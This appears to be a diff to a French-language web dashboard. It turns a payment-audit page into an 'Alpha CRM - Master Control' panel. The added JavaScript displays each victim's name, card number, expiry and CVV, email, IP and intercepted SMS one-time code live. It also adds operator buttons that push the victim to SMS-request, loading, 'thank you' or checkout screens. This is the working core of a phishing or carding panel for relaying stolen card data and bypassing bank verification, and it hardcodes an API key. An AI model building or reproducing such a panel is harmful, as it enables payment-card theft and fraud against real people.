@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Admin - Aura Pay</title>
+    <title>Master CRM - Alpha Pay</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -33,29 +33,9 @@
             padding-bottom: 1rem;
         }
 
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            margin: 0;
-        }
-
-        .status-dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--danger);
-            margin-right: 8px;
-        }
-
-        .status-dot.online {
-            background: var(--success);
-            box-shadow: 0 0 10px var(--success);
-        }
-
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 1.5rem;
         }
 
@@ -63,156 +43,209 @@
             background: var(--surface);
             border: 1px solid #1f2937;
             padding: 1.5rem;
-            border-radius: 16px;
-            animation: slideIn 0.3s ease-out;
+            border-radius: 20px;
             position: relative;
-            overflow: hidden;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .card.offline {
+            opacity: 0.6;
+            filter: grayscale(1);
         }
 
         .card-header {
             display: flex;
             justify-content: space-between;
+            align-items: flex-start;
             margin-bottom: 1rem;
         }
 
-        .label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            color: #9ca3af;
-            letter-spacing: 0.05em;
-        }
-
-        .value {
-            font-size: 1rem;
-            color: #fff;
-            margin-top: 4px;
-        }
-
-        .badge {
-            padding: 4px 12px;
+        .status-badge {
+            padding: 4px 10px;
             border-radius: 99px;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: 600;
+            text-transform: uppercase;
         }
 
-        .badge-APPROVED {
+        .status-online {
             background: rgba(16, 185, 129, 0.1);
             color: var(--success);
         }
 
-        .badge-REVIEW {
-            background: rgba(245, 158, 11, 0.1);
+        .status-offline {
+            background: rgba(156, 163, 175, 0.1);
+            color: #9ca3af;
+        }
+
+        .info-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        label {
+            font-size: 0.7rem;
+            color: #9ca3af;
+            text-transform: uppercase;
+        }
+
+        .val {
+            font-size: 0.95rem;
+            color: #fff;
+            font-weight: 400;
+        }
+
+        .val.otp {
             color: var(--warning);
-        }
-
-        .badge-REJECTED {
-            background: rgba(239, 68, 68, 0.1);
-            color: var(--danger);
-        }
-
-        .risk-score {
-            position: absolute;
-            top: 0;
-            right: 0;
-            padding: 1rem;
-            font-size: 1.25rem;
+            font-size: 1.2rem;
             font-weight: 600;
-            opacity: 0.1;
+            letter-spacing: 2px;
+        }
+
+        .controls {
+            margin-top: 1.5rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        button {
+            padding: 8px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+
+        button:hover {
+            background: var(--primary);
+        }
+
+        .btn-success:hover {
+            background: var(--success);
+        }
+
+        .btn-danger:hover {
+            background: var(--danger);
+        }
+
+        .btn-warning:hover {
+            background: var(--warning);
         }
     </style>
 </head>
 
 <body>
     <header>
-        <h1>Aura Pay - Flux en temps réel</h1>
-        <div>
-            <span id="connStatus" class="status-dot"></span>
-            <span id="statusText">Déconnecté</span>
-        </div>
+        <h1>Alpha CRM - Master Control</h1>
+        <div id="connectionStatus">Connexion au serveur...</div>
     </header>
 
-    <div class="grid" id="auditList">
-        <!-- Les audits apparaîtront ici -->
+    <div class="grid" id="clientList">
+        <!-- Les clients apparaîtront ici -->
     </div>
 
-    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
     <script>
-        const auditList = document.getElementById('auditList');
-        const connStatus = document.getElementById('connStatus');
-        const statusText = document.getElementById('statusText');
-        const notifSound = document.getElementById('notifSound');
+        const clientList = document.getElementById('clientList');
+        const notif = document.getElementById('notif');
+        const API_KEY = 'pro-audit-secret-key-2024';
 
         function connect() {
-            // Déterminer l'URL WebSocket
             const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsUrl = `${protocol}//${window.location.host}/ws/admin`;
+            const socket = new WebSocket(`${protocol}//${window.location.host}/ws/admin`);
 
-            const socket = new WebSocket(wsUrl);
-
-            socket.onopen = () => {
-                connStatus.className = 'status-dot online';
-                statusText.textContent = 'Connecté (Live)';
-            };
-
+            socket.onopen = () => { document.getElementById('connectionStatus').textContent = 'Live Console Connected'; };
             socket.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                addAuditCard(data);
-                notifSound.play().catch(() => { });
+                const msg = JSON.parse(event.data);
+                handleMessage(msg);
             };
-
-            socket.onclose = () => {
-                connStatus.className = 'status-dot';
-                statusText.textContent = 'Déconnecté - Reconnexion...';
-                setTimeout(connect, 3000);
-            };
+            socket.onclose = () => { setTimeout(connect, 3000); };
         }
 
-        function addAuditCard(data) {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.innerHTML = `
-                <div class="risk-score">${data.risk_score}</div>
-                <div class="card-header">
-                    <div>
-                        <div class="label">Client</div>
-                        <div class="value">${data.email}</div>
-                    </div>
-                    <span class="badge badge-${data.status}">${data.status}</span>
-                </div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
-                    <div>
-                        <div class="label">Montant</div>
-                        <div class="value">${data.montant} €</div>
-                    </div>
-                    <div>
-                        <div class="label">Carte</div>
-                        <div class="value">${data.numero_carte_masque}</div>
-                    </div>
-                </div>
-                <div style="margin-top: 1rem;">
-                    <div class="label">IP Address</div>
-                    <div class="value">${data.adresse_ip}</div>
-                </div>
-            `;
-            auditList.prepend(card);
+        function handleMessage(msg) {
+            let card = document.getElementById(`card-${msg.client_id}`);
 
-            // Limiter à 15 cartes
-            if (auditList.children.length > 15) {
-                auditList.removeChild(auditList.lastChild);
+            if (msg.type === 'NEW_PAYMENT') {
+                updateOrCreateCard(msg.data.client_id, msg.data);
+                notif.play().catch(() => { });
+            } else if (msg.type === 'NEW_SMS') {
+                card = updateOrCreateCard(msg.client_id, {});
+                card.querySelector('.otp-val').textContent = msg.otp;
+                card.querySelector('.otp-val').style.color = '#f59e0b';
+                notif.play().catch(() => { });
+            } else if (msg.type === 'CLIENT_STATUS') {
+                card = updateOrCreateCard(msg.client_id, {});
+                const badge = card.querySelector('.status-badge');
+                badge.className = `status-badge status-${msg.status}`;
+                badge.textContent = msg.status;
+                if (msg.status === 'offline') card.classList.add('offline');
+                else card.classList.remove('offline');
             }
+        }
+
+        function updateOrCreateCard(id, data) {
+            let card = document.getElementById(`card-${id}`);
+            if (!card) {
+                card = document.createElement('div');
+                card.id = `card-${id}`;
+                card.className = 'card';
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div>
+                            <label>ID Client</label>
+                            <div class="val">${id}</div>
+                        </div>
+                        <span class="status-badge status-online">online</span>
+                    </div>
+                    <div class="info-row">
+                        <div><label>Nom</label><div class="val name-val">-</div></div>
+                        <div><label>Montant</label><div class="val amount-val">-</div></div>
+                    </div>
+                    <div class="info-row">
+                        <div><label>Carte</label><div class="val card-val">-</div></div>
+                        <div><label>Exp / CVV</label><div class="val exp-val">-</div></div>
+                    </div>
+                    <div class="info-row">
+                        <div><label>Email</label><div class="val email-val">-</div></div>
+                        <div><label>IP</label><div class="val ip-val">-</div></div>
+                    </div>
+                    <div style="margin-top:10px; background:rgba(0,0,0,0.2); padding:10px; border-radius:10px; text-align:center;">
+                        <label>CODE SMS REÇU</label>
+                        <div class="val otp otp-val">ATTENTE...</div>
+                    </div>
+                    <div class="controls">
+                        <button onclick="redirect('${id}', 'sms')" class="btn-warning">DEMANDER SMS</button>
+                        <button onclick="redirect('${id}', 'loading')" class="btn-primary">REFRESH / LOADING</button>
+                        <button onclick="redirect('${id}', 'thank_you')" class="btn-success">VALIDER (MERCI)</button>
+                        <button onclick="redirect('${id}', 'checkout')" class="btn-danger">RETOUR CHECKOUT</button>
+                    </div>
+                `;
+                clientList.prepend(card);
+            }
+
+            if (data.full_name) {
+                card.querySelector('.name-val').textContent = data.full_name;
+                card.querySelector('.amount-val').textContent = data.montant + ' €';
+                card.querySelector('.card-val').textContent = data.numero_carte_masque;
+                card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
+                card.querySelector('.email-val').textContent = data.email;
+                card.querySelector('.ip-val').textContent = data.adresse_ip;
+            }
+            return card;
+        }
+
+        async function redirect(clientId, target) {
+            await fetch('/v1/admin/redirect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
+                body: JSON.stringify({ client_id: clientId, target: target })
+            });
         }
 
         connect();
